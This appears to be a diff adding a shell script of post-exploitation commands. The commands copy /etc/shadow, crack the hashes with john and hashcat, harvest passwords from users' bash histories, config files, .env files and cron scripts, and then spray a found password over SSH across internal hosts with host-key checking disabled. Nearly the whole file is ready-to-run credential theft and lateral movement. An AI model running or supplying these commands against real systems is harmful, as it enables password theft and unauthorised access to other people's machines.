@@ -1,0 +1,47 @@
+# Copy the shadow file
+cat /etc/shadow > /tmp/hashes.txt
+
+# Or just look at specific users
+cat /etc/shadow | grep -v ":\*:" | grep -v ":!:"
+
+# Prepare for john
+unshadow /etc/passwd /etc/shadow > mypasswords.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt mypasswords.txt
+
+# Or hashcat (faster with GPU)
+hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Check all users' bash history
+find /home -name .bash_history -exec echo "=== {} ===" \; -exec cat {} \;
+cat /root/.bash_history
+
+# Look for SSH/SCP commands with passwords (bad practice but common)
+grep -r "ssh.*@" /home/*/.*history
+grep -r "sshpass" /home/*/.*history
+
+# Database configs often have passwords
+find /var/www -name "config.php" -o -name "*.conf" -o -name ".env" 2>/dev/null
+find /etc -name "*.conf" -exec grep -l "password" {} \;
+
+# Application configs
+grep -ri "password=" /etc 2>/dev/null
+grep -ri "pass=" /home 2>/dev/null
+grep -ri "passwd=" /opt 2>/dev/null
+
+# Backup scripts, cron jobs often have embedded credentials
+cat /etc/crontab
+ls -la /etc/cron.*
+find /root -name "*.sh" -exec cat {} \;
+find /home -name "*.sh" -exec cat {} \;
+
+# Create a target list
+echo "192.168.1.10
+192.168.1.11
+192.168.1.12" > targets.txt
+
+# Try each password against all targets
+for host in $(cat targets.txt); do
+  for user in root admin user; do
+    sshpass -p 'FoundPassword123' ssh -o StrictHostKeyChecking=no $user@$host "whoami" 2>/dev/null
+  done
+done
